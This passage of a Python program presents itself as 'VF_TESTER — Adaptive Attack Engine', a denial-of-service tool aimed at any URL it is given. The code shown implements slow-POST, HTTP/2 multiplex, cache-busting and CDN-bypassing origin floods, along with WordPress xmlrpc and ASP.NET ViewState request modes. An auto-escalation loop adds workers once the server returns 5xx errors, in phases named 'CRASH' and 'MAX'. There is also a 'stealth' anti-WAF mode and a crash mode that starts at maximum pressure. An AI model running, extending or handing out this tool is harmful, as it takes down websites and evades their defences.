                    self._viewstate_ts = 0
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="viewstate", hint=f"VS {resp.status} ({vs_size}B)", url=self.url)
                await self.live_log.add("viewstate", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err="Timeout")
            await self.live_log.add("viewstate", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="viewstate", err=type(e).__name__)
            await self.live_log.add("viewstate", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_wp(self, session, wp_config):
        """Single WordPress request"""
        t = time.time()
        try:
            wp_url = f"{self.site_root}/xmlrpc.php"
            payload = f'<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            headers = {**self._base_headers(),
                      "Content-Type": "text/xml",
                      "Origin": self.site_root, "Referer": self.url}
            async with session.post(wp_url, headers=headers, data=payload,
                                   ssl=False, allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="wp", hint=f"WP {resp.status}", url=wp_url)
                await self.live_log.add("wp", resp.status, elapsed, None, wp_url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err="Timeout")
            await self.live_log.add("wp", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="wp", err=type(e).__name__)
            await self.live_log.add("wp", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_slow_post_read(self, session):
        """Single slow POST/READ request"""
        t = time.time()
        try:
            headers = self._base_headers()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["Content-Length"] = str(random.randint(50000, 100000))
            headers["Transfer-Encoding"] = "chunked"
            
            async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
                                   ssl=False, timeout=aiohttp.ClientTimeout(total=30),
                                   allow_redirects=False) as resp:
                elapsed = time.time() - t
                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slow_post",
                                  hint=f"SlowPOST {resp.status} {elapsed:.1f}s", url=self.url)
                await self.live_log.add("slow_post", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            elapsed = time.time() - t
            result = HitResult(ok=True, code=None, rt=elapsed, mode="slow_post",
                              hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
            await self.live_log.add("slow_post", None, elapsed, None, self.url, "timeout")
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slow_post", err=type(e).__name__)
            await self.live_log.add("slow_post", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_http2_multiplex(self, session):
        """Single HTTP/2 multiplexing burst"""
        t = time.time()
        try:
            import httpx
            async with httpx.AsyncClient(http2=True, verify=False, timeout=15) as h2client:
                num_streams = random.randint(10, 30)
                tasks = []
                for _ in range(num_streams):
                    busted = f"{self.url}{'&' if '?' in self.url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else self.url
                    headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*",
                              "Cache-Control": "no-cache"}
                    tasks.append(h2client.get(busted, headers=headers, follow_redirects=False))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                elapsed = time.time() - t
                
                ok_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
                result = HitResult(ok=ok_count > 0, code=200, rt=elapsed, mode="h2mux",
                                  hint=f"H2Mux {num_streams}str {ok_count}ok {elapsed:.1f}s", url=self.url)
                await self.live_log.add("h2mux", 200, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except ImportError:
            await self._single_page(session, [self.url])
            return
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux", err=type(e).__name__)
            await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_cache_deception(self, session):
        """Single cache deception request"""
        t = time.time()
        try:
            path_tricks = [
                lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}",
                lambda u: f"{u}{'&' if '?' in u else '?'}nocache={random.randint(1,99999)}.css",
                lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}.json",
            ]
            url_trick = random.choice(path_tricks)(self.url)
            
            headers = self._base_headers()
            headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
            headers["Pragma"] = "no-cache"
            headers["X-Arvan-Cache"] = "bypass"
            headers["If-Modified-Since"] = "Sat, 01 Jan 2000 00:00:00 GMT"
            headers["If-None-Match"] = f'W/"{random.randint(100000,999999)}"'
            
            async with session.get(url_trick, headers=headers, ssl=False,
                                   allow_redirects=True) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                hit_origin = "x-cache" not in {k.lower(): v for k, v in resp.headers.items()}
                hint_suffix = " ORIGIN!" if hit_origin else ""
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="cache_decep", hint=f"CacheDec {resp.status}{hint_suffix}", url=self.url)
                await self.live_log.add("cache_decep", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err="Timeout", url=self.url)
            await self.live_log.add("cache_decep", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err=type(e).__name__, url=self.url)
            await self.live_log.add("cache_decep", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    async def _single_origin_direct(self, session):
        """Single origin direct request"""
        origin_ips = self.profile.get("origin_ips", [])
        if not origin_ips:
            await self._single_page(session, [self.url])
            return
        
        t = time.time()
        try:
            origin_ip = random.choice(origin_ips)
            origin_url = self.url.replace(self.profile.get("host", ""), origin_ip)
            
            headers = self._base_headers()
            headers["Host"] = self.profile.get("domain", self.site_root.replace("https://", "").replace("http://", ""))
            headers["X-Forwarded-Host"] = self.profile.get("domain", "")
            headers["X-Forwarded-Proto"] = "https"
            
            async with session.get(origin_url, headers=headers, ssl=False,
                                   allow_redirects=False) as resp:
                body = await resp.text()
                elapsed = time.time() - t
                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
                                  mode="origin", hint=f"Origin {resp.status} via {origin_ip}", url=origin_url[:60])
                await self.live_log.add("origin", resp.status, elapsed, None, self.url, result.hint)
                self.health_monitor.record(result)
        except asyncio.TimeoutError:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err="Timeout", url=self.url)
            await self.live_log.add("origin", None, result.rt, "Timeout", self.url)
            self.health_monitor.record(result)
        except Exception as e:
            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err=type(e).__name__, url=self.url)
            await self.live_log.add("origin", None, result.rt, type(e).__name__, self.url)
            self.health_monitor.record(result)
        self._record(result)

    def _spawn_worker(self, session, all_tasks, vectors, pages, resources, delay=0):
        """Spawn a persistent worker that auto-respawns on failure"""
        t = asyncio.create_task(self._persistent_worker(session, vectors, pages, resources, delay=delay))
        all_tasks.append(t)

    def _render_dashboard(self, cur, max_w, step, mode, health, trend,
                          step_dur, step_remaining, strategy,
                          escalation_phase_display="", new_5xx=0):
        if health > 0.7: hc = C.G
        elif health > 0.4: hc = C.Y
        else: hc = C.R

        mode_colors = {"RAMP": C.G, "NORMAL": C.G, "PRESSURE": C.Y, "CRASH": C.R, "MAXIMUM": f"{C.BD}{C.R}"}
        mc = mode_colors.get(mode, C.W)
        mode_display = f"{mc}{mode}{C.RS}"

        trend_icons = {"improving": f"{C.G}^{C.RS}", "degrading": f"{C.R}v{C.RS}",
                      "stable": f"{C.Y}={C.RS}", "unknown": "?"}
        trend_icon = trend_icons.get(trend, "?")

        bar_len = 10
        filled = int(health * bar_len)
        bar = f"{hc}{'|' * filled}{C.DM}{'.' * (bar_len - filled)}{C.RS}"

        rps = self.stats.rrps
        waf_s = f" WAF:{self.detected_waf}" if self.detected_waf else ""
        cms_s = f" CMS:{self.detected_cms}" if self.detected_cms else ""
        asp_s = " ASP.NET" if self.is_aspnet else ""
        esc_s = f" | Phase:{escalation_phase_display}" if escalation_phase_display else ""
        err5xx_s = f" {C.R}5xx:{new_5xx}{C.RS}" if new_5xx > 0 else ""

        line1 = (f"  {mode_display} | {C.CY}{self.stats.dur:.0f}s{C.RS} | "
                f"W:{cur:,}/{max_w:,} | "
                f"Total:{self.stats.total:,} | "
                f"{C.G}OK:{self.stats.ok:,}{C.RS} {C.R}FAIL:{self.stats.fail:,}{C.RS}{err5xx_s} | "
                f"RPS:{rps:.0f}/s | {C.M}{strategy}{C.RS}{waf_s}{cms_s}{asp_s}{esc_s}")

        line2 = (f"  Health:{bar} {hc}{health:.0%}{C.RS} {trend_icon} | "
                f"RT:{self.stats.rart*1000:.0f}ms | "
                f"Step:+{step} every {step_dur}s | "
                f"Next:{step_remaining:.0f}s | "
                f"{C.DM}[+/-] Workers [q] Quit{C.RS}")

        # Breakdown
        bd_parts = []
        if self.stats.login_fail + self.stats.login_ok > 0: bd_parts.append(f"Auth:{self.stats.login_fail+self.stats.login_ok:,}")
        if self.stats.page_hits > 0: bd_parts.append(f"Page:{self.stats.page_hits:,}")
        if self.stats.resource_hits > 0: bd_parts.append(f"Res:{self.stats.resource_hits:,}")
        if self.stats.slowloris_hits > 0: bd_parts.append(f"Slow:{self.stats.slowloris_hits:,}")
        if self.stats.api_hits > 0: bd_parts.append(f"API:{self.stats.api_hits:,}")
        if self.stats.viewstate_hits > 0: bd_parts.append(f"VS:{self.stats.viewstate_hits:,}")
        if self.stats.wp_hits > 0: bd_parts.append(f"WP:{self.stats.wp_hits:,}")
        if self.stats.slow_post_hits > 0: bd_parts.append(f"SlowP:{self.stats.slow_post_hits:,}")
        if self.stats.h2mux_hits > 0: bd_parts.append(f"H2Mux:{self.stats.h2mux_hits:,}")
        if self.stats.cache_decep_hits > 0: bd_parts.append(f"CD:{self.stats.cache_decep_hits:,}")
        if self.stats.origin_hits > 0: bd_parts.append(f"Origin:{self.stats.origin_hits:,}")
        line3 = f"  {C.DM}Breakdown: {' | '.join(bd_parts)}{C.RS}" if bd_parts else ""

        log_lines = self.live_log.get_lines()
        log_display = [self.live_log.format_line(e) for e in log_lines[-8:]]
        while len(log_display) < 8:
            log_display.append(f"  {C.DM}{'.'*60}{C.RS}")

        return line1, line2, line3, log_display

    async def run(self):
        self.stats = Stats()
        self.stats.t0 = time.time()

        vectors = self.attack.get("attack_vectors", ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"])
        strategy = self.attack.get("recommended_strategy", "GENERIC_FLOOD")
        pages = self.page_targets or [self.url]
        resources = self.resource_targets or [f"{self.site_root}/favicon.ico"]

        # Ensure we have targets
        if not pages:
            pages = [self.url, f"{self.site_root}/"]

        actual_max = self.max_workers

        # ═══ AUTO-ESCALATION ═══
        # Start LOW, gradually increase pressure until server errors appear
        escalation_phase = "WARMUP"  # WARMUP -> RAMP -> PRESSURE -> CRASH -> MAX
        prev_5xx_count = 0
        first_5xx_seen = False
        consecutive_5xx_steps = 0  # How many steps in a row we've seen 5xx

        # Print startup banner
        print(f"\n{'='*72}")
        print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
        print(f"{'='*72}")
        print(f"  Target:   {C.W}{self.url}{C.RS}")
        print(f"  Strategy: {C.Y}{strategy}{C.RS}")
        if self.detected_waf: print(f"  WAF:      {C.R}{self.detected_waf}{C.RS}")
        if self.detected_cms: print(f"  CMS:      {C.Y}{self.detected_cms}{C.RS}")
        if self.is_aspnet:    print(f"  ASP.NET:  {C.M}ViewState Attack Enabled{C.RS}")
        if self.is_wordpress: print(f"  WordPress:{C.CY} XMLRPC + WP-Login Enabled{C.RS}")
        origin_ips = self.profile.get("origin_ips", [])
        if origin_ips: print(f"  Origin:   {C.G}{len(origin_ips)} IPs found (CDN bypass){C.RS}")
        print(f"  Vectors:  {', '.join(vectors)}")
        print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
        print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
        print(f"  Mode:     {C.Y}AUTO-ESCALATE — gradually increasing pressure{C.RS}")
        print(f"  Controls: {C.BD}[+]{C.RS} Add workers  {C.BD}[-]{C.RS} Remove  {C.BD}[q]{C.RS} Quit")
        print(f"{'='*72}\n")

        await self.keyboard.start()

        connector = aiohttp.TCPConnector(
            limit=actual_max * 2 + 1000,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=30,
            keepalive_timeout=30,
        )

        timeout = aiohttp.ClientTimeout(total=20)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Pre-fetch if ASP.NET
            if self.is_aspnet:
                await self._refresh_viewstate(session)

            all_tasks = []
            cur = 0

            # Initial workers — start LOW for auto-escalation
            for _ in range(self.initial_workers):
                delay = random.uniform(0, 2.0)
                self._spawn_worker(session, all_tasks, vectors, pages, resources, delay=delay)
                cur += 1

            while not self._stop.is_set():
                # Handle keyboard
                key = self.keyboard.get_key()
                if key == '+':
                    self._manual_delta += self.step
                elif key == '-':
                    self._manual_delta -= self.step
                elif key == 'q':
                    self._stop.set()
                    break

                # ═══ AUTO-ESCALATION LOGIC ═══
                # Check for 5xx server errors in recent responses
                current_5xx = sum(self.stats.codes.get(c, 0) for c in (500, 502, 503, 504))
                new_5xx = current_5xx - prev_5xx_count
                prev_5xx_count = current_5xx

                if new_5xx > 0:
                    if not first_5xx_seen:
                        first_5xx_seen = True
                        print(f"\n  {C.BD}{C.Y}[5xx FIRST] First server error detected! Server is starting to struggle.{C.RS}")
                    consecutive_5xx_steps += 1
                    escalation_phase = "PRESSURE"
                else:
                    consecutive_5xx_steps = max(0, consecutive_5xx_steps - 1)

                # Calculate auto-escalation step based on phase
                if escalation_phase == "WARMUP":
                    # WARMUP: gradual increase, small steps
                    auto_step = self.step
                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"
                elif escalation_phase == "PRESSURE":
                    # PRESSURE: 5xx detected, increase faster
                    auto_step = self.step * 2
                    escalation_phase_display = f"{C.Y}PRESSURE{C.RS}"
                    if consecutive_5xx_steps >= 3:
                        escalation_phase = "CRASH"
                elif escalation_phase == "CRASH":
                    # CRASH: many 5xx errors, hit hard
                    auto_step = self.step * 4
                    escalation_phase_display = f"{C.R}CRASH{C.RS}"
                    if consecutive_5xx_steps >= 5:
                        escalation_phase = "MAX"
                elif escalation_phase == "MAX":
                    # MAX: server is dying, maximum pressure
                    auto_step = self.step * 6
                    escalation_phase_display = f"{C.BD}{C.R}MAX{C.RS}"
                else:
                    auto_step = self.step
                    escalation_phase_display = f"{C.G}WARMUP{C.RS}"

                # Smart Crash Mode (from health monitor)
                mode, worker_delta = self.health_monitor.get_pressure_advice(
                    cur, actual_max, self.step)

                # Use the LARGER of auto-escalation step or health monitor advice
                effective_delta = max(auto_step, worker_delta)

                # Manual delta
                if self._manual_delta > 0:
                    add_count = min(self._manual_delta, actual_max - cur)
                    if add_count > 0:
                        cur += add_count
                        for _ in range(add_count):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)
                    self._manual_delta = 0
                elif self._manual_delta < 0:
                    remove_count = min(abs(self._manual_delta), cur)
                    if remove_count > 0:
                        for _ in range(remove_count):
                            if all_tasks:
                                t = all_tasks.pop()
                                t.cancel()
                        cur -= remove_count
                    self._manual_delta = 0

                # Apply auto-escalation
                if effective_delta > 0 and cur < actual_max:
                    new = min(effective_delta, actual_max - cur)
                    if new > 0:
                        cur += new
                        if escalation_phase == "MAX":
                            print(f"\n  {C.BD}{C.R}[!!!] SERVER DYING — MAXIMUM PRESSURE +{new} -> {cur:,}{C.RS}")
                        elif escalation_phase == "CRASH":
                            print(f"\n  {C.R}[CRASH] Server failing — +{new} workers -> {cur:,}{C.RS}")
                        elif escalation_phase == "PRESSURE":
                            print(f"\n  {C.Y}[PRESS] Server struggling — +{new} workers -> {cur:,}{C.RS}")
                        elif mode == "RAMP":
                            print(f"\n  {C.G}[RAMP] Scaling up — +{new} workers -> {cur:,}{C.RS}")
                        for _ in range(new):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)

                # Bonus pressure when 5xx detected in current step
                if new_5xx > 0:
                    bonus = min(int(self.step * 0.5 * (1 + consecutive_5xx_steps)), actual_max - cur)
                    if bonus > 0:
                        cur += bonus
                        print(f"\n  {C.BD}{C.R}[5xx x{new_5xx}] Server errors! Escalating pressure... +{bonus} -> {cur:,}{C.RS}")
                        for _ in range(bonus):
                            self._spawn_worker(session, all_tasks, vectors, pages, resources)

                self.stats.users = cur

                # Render dashboard
                step_t0 = time.time()
                while time.time() - step_t0 < self.step_duration and not self._stop.is_set():
                    health = self.health_monitor.health_score
                    trend = self.health_monitor.trend
                    step_remaining = self.step_duration - (time.time() - step_t0)
                    line1, line2, line3, log_display = self._render_dashboard(
                        cur, actual_max, self.step, mode, health, trend,
                        self.step_duration, step_remaining, strategy,
                        escalation_phase_display=escalation_phase_display,
                        new_5xx=new_5xx)

                    total_lines = 3 + 8 + 2
                    sys.stdout.write(f"\033[{total_lines}A")
                    sys.stdout.write(C.clear_line() + "\r" + line1 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + line2 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + line3 + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    for log_line in log_display:
                        sys.stdout.write(C.clear_line() + "\r" + log_line + "\n")
                    sys.stdout.write(C.clear_line() + "\r" + f"  {C.DM}{'─'*70}{C.RS}" + "\n")
                    sys.stdout.flush()
                    await asyncio.sleep(0.5)

                self._snap()

            # Cleanup
            await self.keyboard.stop()
            self._stop.set()
            if all_tasks:
                done, pending = await asyncio.wait(all_tasks, timeout=3)
                for t in pending: t.cancel()

    def _snap(self):
        self._snaps.append({
            "t": self.stats.dur, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": self.stats.rrps, "workers": self.stats.users,
            "health": self.health_monitor.health_score,
        })


# ═══════════════════════════════════════════════════════════════════════════════
# Report
# ═══════════════════════════════════════════════════════════════════════════════

def report(st: Stats, url: str, tester: VFTester):
    print(f"\n\n{'='*72}")
    print(f"  {C.BD}{C.R}VF_TESTER — Attack Report{C.RS}")
    print(f"{'='*72}")
    print(f"  Target:   {url}")
    print(f"  Strategy: {tester.attack.get('recommended_strategy', 'AUTO')}")
    if tester.detected_waf: print(f"  WAF:      {tester.detected_waf}")
    if tester.detected_cms: print(f"  CMS:      {tester.detected_cms}")
    print(f"{'─'*72}")

    print(f"\n  +-- {C.BD}Summary{C.RS} ------------------------------------------------+")
    print(f"  | Duration:    {st.dur:.1f}s ({st.dur/60:.1f} min)")
    print(f"  | Total:       {st.total:,}")
    print(f"  | OK:          {C.G}{st.ok:,}{C.RS}")
    print(f"  | Failed:      {C.R}{st.fail:,}{C.RS}")
    print(f"  | RPS:         {st.rps:.1f}")
    if tester._snaps: print(f"  | Max RPS:     {max(s['rps'] for s in tester._snaps):.1f}")
    print(f"  +---------------------------------------------------+")

    print(f"\n  +-- {C.BD}Breakdown{C.RS} ----------------------------------------------+")
    if st.total:
        auth = st.login_fail + st.login_ok
        print(f"  | Auth:       {auth:,} ({auth/st.total*100:.1f}%)")
        print(f"  | Pages:      {st.page_hits:,} ({st.page_hits/st.total*100:.1f}%)")
        print(f"  | Resources:  {st.resource_hits:,} ({st.resource_hits/st.total*100:.1f}%)")
        if st.slowloris_hits: print(f"  | Slowloris:  {st.slowloris_hits:,}")
        if st.api_hits:       print(f"  | API:        {st.api_hits:,}")
        if st.viewstate_hits: print(f"  | ViewState:  {st.viewstate_hits:,}")
        if st.wp_hits:        print(f"  | WordPress:  {st.wp_hits:,}")
    print(f"  +---------------------------------------------------+")

    # Crash Mode Summary
    if tester.health_monitor.crash_mode_active:
        print(f"\n  +-- {C.BD}{C.R}Crash Mode{C.RS} --------------------------------------------+")
        print(f"  | Final Health: {tester.health_monitor.health_score:.0%}")
        print(f"  | Trend:        {tester.health_monitor.trend}")
        print(f"  | Server Dying: {'YES' if tester.health_monitor.server_dying else 'NO'}")
        print(f"  +---------------------------------------------------+")

    if st.codes:
        print(f"\n  +-- {C.BD}Status Codes{C.RS} -------------------------------------------+")
        for code in sorted(st.codes.keys()):
            count = st.codes[code]
            cc = C.G if code < 300 else C.Y if code < 500 else C.R
            print(f"  | {cc}{code}{C.RS}: {count:,} ({count/st.total*100:.1f}%)")
        print(f"  +---------------------------------------------------+")

    print(f"\n{'='*72}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="VF_TESTER — Adaptive Attack Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("url", nargs='?', default=None, help="Target URL (positional or --url)")
    p.add_argument("--profile", default=None, help="VF_PROFILE.json from VF_FINDER")
    p.add_argument("--url", default=None, help="Target URL (auto-runs FINDER if no profile)")
    p.add_argument("--max-workers", type=int, default=None, help="Override max workers")
    p.add_argument("--step", type=int, default=None, help="Override step size")
    p.add_argument("--stealth", action="store_true", help="Stealth mode: slow ramp, low workers, high delay, header randomization (anti-WAF)")
    p.add_argument("--crash-mode", action="store_true", help="Force crash mode (start at max pressure)")
    p.add_argument("--deep", action="store_true", help="Run FINDER with deep scan")
    p.add_argument("--dns", action="store_true", help="Run FINDER with DNS scan")
    return p.parse_args()


async def run_finder_first(url: str, deep: bool = False, dns: bool = False) -> str:
    """Run VF_FINDER first to generate profile, then return profile path"""
    print(f"\n  {C.CY}[VF] Running VF_FINDER first...{C.RS}")

    # Try to import VF_FINDER from the paths we added to sys.path
    try:
        from VF_FINDER import VFFinder
    except ImportError:
        # Last resort: try to find VF_FINDER.py manually and add its directory
        finder_path = None
        search_dirs = [_THIS_DIR, os.path.join(_THIS_DIR, 'finder'),
                       os.path.join(_THIS_DIR, '..'), os.path.join(_THIS_DIR, '..', 'finder'),
                       os.getcwd(), os.path.join(os.getcwd(), 'finder')]
        for d in search_dirs:
            candidate = os.path.normpath(os.path.join(d, 'VF_FINDER.py'))
            if os.path.isfile(candidate):
                finder_path = d
                sys.path.insert(0, os.path.normpath(d))
                break
        if finder_path:
            try:
                from VF_FINDER import VFFinder
            except ImportError as e2:
                print(f"\n  {C.R}[ERROR] Found VF_FINDER.py at {finder_path} but import failed: {e2}{C.RS}")
                print(f"  {C.R}[ERROR] sys.path: {sys.path[:5]}{C.RS}")
                sys.exit(1)
        else:
            print(f"\n  {C.R}[ERROR] VF_FINDER.py not found!{C.RS}")
            print(f"  {C.R}[ERROR] Searched: {search_dirs}{C.RS}")
            print(f"  {C.R}[ERROR] Make sure VF_FINDER.py is in the same directory as VF_TESTER.py{C.RS}")
            print(f"  {C.R}[ERROR]   OR in a 'finder/' subdirectory{C.RS}")
            print(f"  {C.R}[ERROR]   OR in the parent directory{C.RS}")
            sys.exit(1)

    finder = VFFinder(url, deep=deep, dns_scan=dns)
    profile = await finder.scan()

    # Save profile — in the same directory as VF_FINDER.py or current dir
    output_path = "VF_PROFILE.json"
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(profile.to_dict(), f, ensure_ascii=False, indent=2)

    print(f"  {C.G}[VF] Profile saved to {output_path}{C.RS}")
    return output_path


async def main():
    args = parse_args()

    profile_path = args.profile
    crash_mode = args.crash_mode

    # If no profile, run FINDER first
    if not profile_path:
        url = args.url or getattr(args, 'url', None)
        if not url:
            # Interactive prompt — ask user for target URL
            print(f"\n{'='*72}")
            print(f"  {C.BD}{C.R}VF_TESTER — Adaptive Attack Engine{C.RS}")
            print(f"{'='*72}")
            url = input(f"  {C.CY}Enter target URL: {C.RS}").strip()
            if not url:
                print(f"  {C.R}[ERROR] No URL provided. Exiting.{C.RS}")
                return

        if not url.startswith("http"):
            url = "https://" + url

        profile_path = await run_finder_first(url, deep=args.deep, dns=args.dns)

    # Create tester with profile
    tester = VFTester(profile_path=profile_path)

    # Stealth mode — anti-WAF slow & low profile
    if args.stealth:
        tester.initial_workers = min(tester.initial_workers, 3)
        tester.max_workers = min(tester.max_workers, 500)
        tester.step = min(tester.step, 5)
        tester.step_duration = max(tester.step_duration, 15)
        tester.request_delay_ms = max(tester.request_delay_ms, 200)
        tester.enable_header_random = True
        print(f"  {C.CY}[STEALTH] Mode activated — low profile anti-WAF{C.RS}")
        print(f"  {C.CY}[STEALTH] Workers: {tester.initial_workers}->{tester.max_workers} | Step: +{tester.step} every {tester.step_duration}s | Delay: {tester.request_delay_ms}ms{C.RS}")
        print(f"  {C.CY}[STEALTH] Header randomization: ON | Cache bust: ON | UA rotation: ON{C.RS}")

    # Crash mode — start at maximum pressure
    if crash_mode:
        tester.initial_workers = tester.max_workers
        tester.step = tester.max_workers
        tester.health_monitor.crash_mode_active = True
        print(f"  {C.BD}{C.R}[CRASH MODE] Starting at MAXIMUM pressure!{C.RS}")
        print(f"  {C.BD}{C.R}[CRASH MODE] Workers: {tester.max_workers:,} | Step: +{tester.step}{C.RS}")

    # Apply overrides
    if args.max_workers:
        tester.max_workers = args.max_workers
    if args.step:
        tester.step = args.step

    # Signal handlers (Unix only)
    if not IS_WINDOWS:
        try:
            loop = asyncio.get_event_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, tester.stop)
        except Exception:
            pass

    # Print blank lines for TUI dashboard
    print(f"\n" * 13)

    try:
        await tester.run()
    except KeyboardInterrupt:
        tester.stop()
    except Exception as e:
        print(f"\n  {C.R}[ERROR] {e}{C.RS}")
    finally:
        await tester.keyboard.stop()
        report(tester.stats, tester.url, tester)

        # Save JSON report
        try:
            data = {
                "target": tester.url,
                "strategy": tester.attack.get("recommended_strategy"),
                "waf": tester.detected_waf,
                "cms": tester.detected_cms,
                "duration": tester.stats.dur,
                "total": tester.stats.total,
                "ok": tester.stats.ok,
                "fail": tester.stats.fail,
                "final_health": tester.health_monitor.health_score,
                "timeline": tester._snaps,
            }
            with open("VF_ATTACK_REPORT.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            pass


if __name__ == "__main__":
    asyncio.run(main())
